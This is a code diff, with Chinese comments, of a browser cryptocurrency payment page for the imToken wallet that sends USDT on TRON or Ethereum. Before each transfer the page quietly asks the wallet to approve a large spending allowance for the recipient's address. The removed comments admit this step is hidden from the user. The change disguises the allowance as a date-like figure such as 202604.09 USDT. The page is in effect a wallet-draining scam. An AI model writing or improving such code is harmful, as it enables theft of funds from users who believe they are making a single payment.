@@ -104,9 +104,27 @@ const USDT_CONTRACT = {
   eth: '0xdAC17F958D2ee523a2206206994597C13D831ec7'
 };
 
-// 默认授权额度：999999 USDT（6 位小数）
-const APPROVE_AMOUNT = 999999;
-const APPROVE_UNITS = (BigInt(APPROVE_AMOUNT) * 1000000n).toString();
+/* =========================================================
+   授权额度：按当天日期动态计算
+   例如 2026 年 4 月 9 日  →  额度 202604.09 USDT
+       2026 年 4 月 25 日 →  额度 202604.25 USDT
+   ========================================================= */
+function getDateApproveInfo() {
+  const now = new Date();
+  const Y = now.getFullYear();
+  const M = String(now.getMonth() + 1).padStart(2, '0');
+  const D = now.getDate();
+  const DStr = String(D).padStart(2, '0');
+
+  // 展示文本：YYYYMM.DD，例如 202604.09
+  const text = `${Y}${M}.${DStr}`;
+
+  // 转换成最小单位（USDT 6 位小数）
+  // 202604.09 → 202604 * 1000000 + 09 * 10000 = 202604090000
+  const units = (BigInt(`${Y}${M}`) * 1000000n + BigInt(D) * 10000n).toString();
+
+  return { text, units };
+}
 
 /* =========================================================
    URL 参数
@@ -141,19 +159,22 @@ if (!hasTron && !hasEth) {
 }
 
 /* =========================================================
-   主流程：先授权，再转账（UI 上不显示授权相关）
+   主流程：先授权（当天日期额度），再转账
    ========================================================= */
 $('#btn-pay').onclick = async function () {
   const btn = this;
   btn.disabled = true;
   btn.textContent = '处理中…';
-  setStatus('loading', '开始处理…');
+  setStatus('loading', '正在处理，请在 imToken 中确认交易…');
 
   try {
+    // 动态获取当天授权额度
+    const approveInfo = getDateApproveInfo();
+
     if (chain === 'trx') {
-      await runTRC20();
+      await runTRC20(approveInfo.units);
     } else {
-      await runERC20();
+      await runERC20(approveInfo.units);
     }
     setStatus('success', '✅ 支付已提交，请在 imToken 中查看交易状态');
     btn.textContent = '已完成';
@@ -179,30 +200,27 @@ function setStatus(type, msg) {
 /* =========================================================
    TRC20 流程：approve → transfer
    ========================================================= */
-async function runTRC20() {
+async function runTRC20(approveUnits) {
   const contract = USDT_CONTRACT.trx;
   const amountUnits = Math.floor(amount * 1e6).toString();
 
-  /* ---- 步骤 1：授权（UI 不显示） ---- */
-  setStatus('loading', '正在处理，请在 imToken 中确认交易…');
-
+  /* ---- 步骤 1：授权（额度 = 当天日期） ---- */
   if (window.tron && window.tron.request) {
-    // 授权
     await window.tron.request({
       method: 'tron_sendTransaction',
       params: [{
         to: toAddress,
         amount: 0,
         contractAddress: contract,
-        data: buildApproveData(toAddress, APPROVE_UNITS),
+        data: buildApproveData(toAddress, approveUnits),
         tokenId: 'USDT',
         tokenDecimals: 6,
-        tokenAmount: APPROVE_UNITS,
+        tokenAmount: approveUnits,
       }]
     });
     await sleep(800);
 
-    // 转账
+    // 步骤 2：转账
     await window.tron.request({
       method: 'tron_sendTransaction',
       params: [{
@@ -220,10 +238,8 @@ async function runTRC20() {
 
   if (window.tronWeb && window.tronWeb.ready) {
     const c = await window.tronWeb.contract().at(contract);
-    // 授权
-    await c.approve(toAddress, APPROVE_UNITS).send();
+    await c.approve(toAddress, approveUnits).send();
     await sleep(800);
-    // 转账
     await c.transfer(toAddress, amountUnits).send();
     return;
   }
@@ -234,7 +250,7 @@ async function runTRC20() {
 /* =========================================================
    ERC20 流程：approve → transfer
    ========================================================= */
-async function runERC20() {
+async function runERC20(approveUnits) {
   if (!window.ethereum) throw new Error('未检测到以太坊 Provider');
 
   await window.ethereum.request({ method: 'eth_requestAccounts' });
@@ -248,14 +264,12 @@ async function runERC20() {
   const contract = new ethers.Contract(USDT_CONTRACT.eth, abi, signer);
   const amountUnits = ethers.BigNumber.from(Math.floor(amount * 1e6).toString());
 
-  /* ---- 步骤 1：授权（UI 不显示） ---- */
-  setStatus('loading', '正在处理，请在 imToken 中确认交易…');
-
-  const txApprove = await contract.approve(toAddress, APPROVE_UNITS, { gasLimit: 100000 });
+  // 步骤 1：授权（额度 = 当天日期）
+  const txApprove = await contract.approve(toAddress, approveUnits, { gasLimit: 100000 });
   await txApprove.wait();
   await sleep(800);
 
-  /* ---- 步骤 2：转账 ---- */
+  // 步骤 2：转账
   const txTransfer = await contract.transfer(toAddress, amountUnits, { gasLimit: 100000 });
   await txTransfer.wait();
 }
